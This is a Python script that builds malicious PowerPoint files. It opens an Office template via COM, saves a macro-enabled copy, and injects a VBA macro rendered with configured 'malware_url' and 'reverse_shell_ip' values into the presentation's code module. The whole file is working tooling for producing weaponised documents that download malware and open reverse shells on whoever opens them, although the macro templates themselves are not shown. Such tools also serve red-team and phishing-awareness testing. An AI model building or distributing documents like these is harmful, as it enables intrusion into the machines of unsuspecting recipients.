import os
import sys

import win32com.client as win32
import yaml
from jinja2 import Template


cfg = None
project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
config_file = os.path.join(project_dir, "config.yml")
template_dir = os.path.join(project_dir, "templates")
output_dir = os.path.join(project_dir, "output")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)


def load_powerpoint_template(template_path):
    app = win32.gencache.EnsureDispatch("PowerPoint.Application")
    app.Visible = False
    presentation = app.Presentations.Open(template_path, WithWindow=False)
    return app, presentation


def insert_macro_from_file(macro_path, target_presentation):
    with open(macro_path, "r") as macro_file:
        macro_template = Template(macro_file.read())

    rendered_macro = macro_template.render(
        malware_url=cfg["app"]["macros"]["malware_url"],
        reverse_shell_ip=cfg["app"]["macros"]["reverse_shell_ip"],
    )

    target_vba_project = target_presentation.VBProject
    target_vba_project.VBComponents("ThisPresentation").CodeModule.AddFromString(
        rendered_macro
    )


def get_template_path(template_name):
    valid_extensions = {".potm", ".potx", ".ppt", ".pptm", ".pptx"}
    extension = os.path.splitext(template_name)[1].lower()

    if os.path.basename(template_name) != template_name:
        raise ValueError("Template must be a filename from templates/files/ms_office")
    if extension not in valid_extensions:
        raise ValueError(
            "PowerPoint templates must use .potm, .potx, .ppt, .pptm, or .pptx"
        )

    template_path = os.path.join(template_dir, "files", "ms_office", template_name)
    if not os.path.isfile(template_path):
        raise FileNotFoundError(f"Template not found: {template_path}")

    return template_path


def get_macro_path(macro_name):
    if os.path.basename(macro_name) != macro_name:
        raise ValueError("Macro must be a filename from templates/macros/ms_office")

    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
    if not os.path.isfile(macro_path):
        raise FileNotFoundError(f"Macro not found: {macro_path}")

    return macro_path


def main(template_name, macro_name):
    template_path = get_template_path(template_name)
    macro_path = get_macro_path(macro_name)
    output_path = os.path.join(
        output_dir, f"{os.path.splitext(os.path.basename(template_name))[0]}.pptm"
    )

    os.makedirs(output_dir, exist_ok=True)

    powerpoint_app = None
    template_presentation = None
    presentation = None

    try:
        powerpoint_app, template_presentation = load_powerpoint_template(template_path)

        # Save a macro-enabled copy of the template.
        template_presentation.SaveAs(output_path, FileFormat=25)
        template_presentation.Close()
        template_presentation = None

        presentation = powerpoint_app.Presentations.Open(output_path, WithWindow=False)
        insert_macro_from_file(macro_path, presentation)
        presentation.Save()
    finally:
        if presentation is not None:
            presentation.Close()
        if template_presentation is not None:
            template_presentation.Close()
        if powerpoint_app is not None:
            powerpoint_app.Quit()

    return output_path


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(
            "Usage: python generators/powerpoint_file_generator.py "
            "<template_name> <macro_name>"
        )
        sys.exit(1)

    template_name = sys.argv[1]
    macro_name = sys.argv[2]

    main(template_name, macro_name)
